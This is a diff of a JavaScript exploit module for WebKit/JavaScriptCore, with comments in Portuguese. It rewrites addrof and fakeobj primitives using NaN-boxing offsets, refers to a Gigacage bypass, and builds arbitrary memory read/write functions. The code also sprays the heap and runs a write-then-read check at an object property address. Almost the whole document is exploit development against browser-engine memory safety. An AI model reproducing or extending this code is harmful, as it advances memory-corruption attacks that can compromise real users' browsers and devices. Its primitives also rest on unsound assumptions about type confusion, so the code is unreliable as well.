@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v100 - R60 Final com Estabilização e Verificação de L/E)
+// js/script3/testArrayBufferVictimCrash.mjs (v107 - Portabilidade de Primitivas Avançadas)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
-// Implementada uma verificação funcional de escrita e leitura para confirmar que as
-// primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
+// Portabilidade dos conceitos de bypass de Gigacage e manipulação de NaN Boxing
+// para criar primitivas 'addrof' e 'fakeobj' estáveis e robustas.
+// A estrutura de verificação e estabilização de heap (Fases 3 e 4) foi mantida.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,7 +14,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v100_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v107_Ported";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -34,38 +34,60 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (COM TÉCNICAS AVANÇADAS PORTADAS)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Primitivas Avançadas Portadas ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou." };
 
     try {
-        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
-        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
+        // =======================================================================================
+        // --- INÍCIO DA SEÇÃO PORTADA: Implementação de addrof/fakeobj com NaN Boxing ---
+        // Esta seção substitui a antiga "Fase 1/2".
+        // =======================================================================================
+        logS3("--- FASE 1/2: Configurando primitivas 'addrof' e 'fakeobj' com NaN Boxing... ---", "subtest");
 
-        const confused_array = [13.37];
-        const victim_array = [{ a: 1 }];
+        // O "slot vulnerável" representa o local na memória onde sua vulnerabilidade
+        // (que bypassa o Gigacage) permite a confusão de tipo entre ponteiro e double.
+        const vulnerable_slot = [13.37]; 
+        
+        // Offset para desempacotar/empacotar ponteiros de objetos em doubles.
+        // 0x0001000000000000 representa 2^48, um offset comum no JSC.
+        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
+
         const addrof = (obj) => {
-            victim_array[0] = obj;
-            return doubleToInt64(confused_array[0]);
+            // 1. A vulnerabilidade coloca o ponteiro para 'obj' no slot.
+            vulnerable_slot[0] = obj;
+            // 2. Lemos o slot como se fosse um double, mas na verdade ele contém o ponteiro "boxeado".
+            let value_as_double = vulnerable_slot[0];
+            // 3. Convertemos o double para sua representação de 64 bits.
+            let value_as_int64 = doubleToInt64(value_as_double);
+            // 4. Subtraímos o offset para "desempacotar" e obter o endereço real.
+            return value_as_int64.sub(NAN_BOXING_OFFSET);
         };
-        const fakeobj = (addr) => {
-            confused_array[0] = int64ToDouble(addr);
-            return victim_array[0];
-        };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
 
-        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
+        const fakeobj = (addr) => {
+            // 1. Pegamos o endereço real e adicionamos o offset para "empacotá-lo".
+            const boxed_addr = new AdvancedInt64(addr).add(NAN_BOXING_OFFSET);
+            // 2. Convertemos o valor de 64 bits para um double.
+            const value_as_double = int64ToDouble(boxed_addr);
+            // 3. A vulnerabilidade escreve este double malicioso no slot.
+            vulnerable_slot[0] = value_as_double;
+            // 4. Retornamos o conteúdo do slot, que o motor JS agora trata como um ponteiro de objeto.
+            return vulnerable_slot[0];
+        };
+        logS3("Primitivas 'addrof' e 'fakeobj' robustas estão operacionais.", "good");
+        // =======================================================================================
+        // --- FIM DA SEÇÃO PORTADA ---
+        // =======================================================================================
+
+        // --- FASE 3: Construção da Primitiva de L/E Autocontida (Mantida) ---
+        // Esta estrutura é excelente e agora será alimentada por primitivas estáveis.
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker);
-        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high()); // Offset comum da primeira propriedade
-
+        
         const arb_read_final = (addr) => {
             leaker.obj_prop = fakeobj(addr);
             return doubleToInt64(leaker.val_prop);
@@ -76,22 +98,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
-        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
+        // --- FASE 4: Estabilização e Verificação Funcional (Mantida) ---
+        // Esta verificação final é crucial e agora deve passar sem problemas.
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
         
-        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
         const spray = [];
         for (let i = 0; i < 1000; i++) {
-            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
+            spray.push({ a: 1.1, b: 2.2 }); // Usando doubles para consistência
         }
-        const test_obj = spray[500]; // Pega um objeto do meio do spray
+        const test_obj = spray[500];
         logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
-        // 2. Teste de Escrita e Leitura
         const test_obj_addr = addrof(test_obj);
         const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        
-        // A primeira propriedade (inline) de um objeto JS geralmente fica no offset 0x10
         const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
         
         logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
